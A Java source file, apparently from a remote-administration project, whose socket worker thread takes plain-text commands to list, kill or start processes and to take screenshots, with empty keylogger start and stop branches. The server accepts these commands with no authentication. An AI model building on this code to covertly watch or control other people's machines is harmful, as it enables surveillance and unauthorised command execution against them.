package Function;

import java.net.*;

import KeyLogger.KeyLogger;
import Protocols.command.keylog;
import ScreenCapture.ScreenCapture;
import process.ListProcess;
import process.ProcessKill;
import process.ProcessStart;

import java.io.*;

public class WorkerThread extends Thread {
	private InputStream inputStream = null;
	private OutputStream outputStream = null;
	private Socket clientSocket = null;
	

	public WorkerThread(Socket clientSocket) {
		try {
			this.clientSocket = clientSocket;
			this.inputStream = clientSocket.getInputStream();
			this.outputStream = clientSocket.getOutputStream();
		} catch (Exception e) {
			// TODO: handle exception
		}

	}

	@Override
	public void run() {
		try {
			ObjectOutputStream oos = new ObjectOutputStream(outputStream);
			ObjectInputStream ois = new ObjectInputStream(inputStream);

			String request = (String) ois.readObject();	
			String[] request_elements = request.split(" ");
			// gui request nhu sau: "KILL_PROCESS 12312"
			// gui request nhu sau: "START_PROCESS pornhub.exe"

			if (request.equals("GET_PROCESS_LIST")) {
				System.out.println(request);
				ListProcess listProcess = new ListProcess(oos);
				listProcess.set_listProcess();
				listProcess.sendListProcess();
			} else if (request_elements[0].equals("KILL_PROCESS")) {
				ProcessKill processKill = new ProcessKill(oos, request_elements[1]);
				processKill.kill();
				processKill.send_result();
			} else if (request_elements[0].equals("START_PROCESS")) {
				ProcessStart processStart = new ProcessStart(oos, request_elements[1]);
				processStart.start_file();
				processStart.send_result();
			}else if(request.equals("KEY_LOGGER_START")) {
				
			} else if(request.equals("KEY_LOGGER_STOP")) {
				
			} else if(request.equals("SCREEN_CAPTURE")){
				System.out.println(request);
				ScreenCapture screenCapture = new ScreenCapture(oos);
				screenCapture.get_Screenshot();
				screenCapture.send_ScreenShot();
			}
			oos.close();
			ois.close();
		} catch (Exception e) {
			// TODO: handle exception
		}
	}
}
